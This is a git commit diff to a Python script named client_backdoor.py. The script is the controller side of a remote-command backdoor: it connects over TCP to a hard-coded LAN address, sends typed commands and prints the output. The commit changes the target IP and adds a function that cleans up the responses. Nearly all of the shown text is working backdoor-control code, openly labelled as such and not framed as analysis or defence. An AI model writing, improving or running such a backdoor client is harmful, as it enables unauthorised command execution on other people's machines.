27125186633489582fef87dd98267408dfaad439
Fournoy <152728394+Fournoy@users.noreply.github.com>
2024-12-15 22:45:59 +0100

    Update client_backdoor.py

--- client_backdoor.py
+++ client_backdoor.py
@@ -4,9 +4,17 @@ import subprocess
 import re
 
 ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-host = "192.168.1.122" #ip server
+host = "192.168.1.20" #ip server
 port = 12345 #port server
 print("[**] Connecting to the backdoor...")
+
+def cleaned_text(rsp):
+        rsp = re.sub(r'\r\n', '\n', rsp)
+        rsp = re.sub(r'\r\n\r\n', '\n', rsp)   
+        rsp = re.sub('\x82', 'é', rsp)  
+        rsp = re.sub('\xff057', '', rsp)
+        return rsp
+
 try: 
     ss.connect((host, port)) #connect to the server
     time.sleep(1)
@@ -20,7 +28,10 @@ try:
         cmd = str.encode(cmd + '\n')
         ss.send(cmd)
         rsp = ss.recv(1024)
-        print(rsp)
+        print(cleaned_text(str(rsp)))
+        
+        
 
 except:
         print("Probleme during the connection")
+        
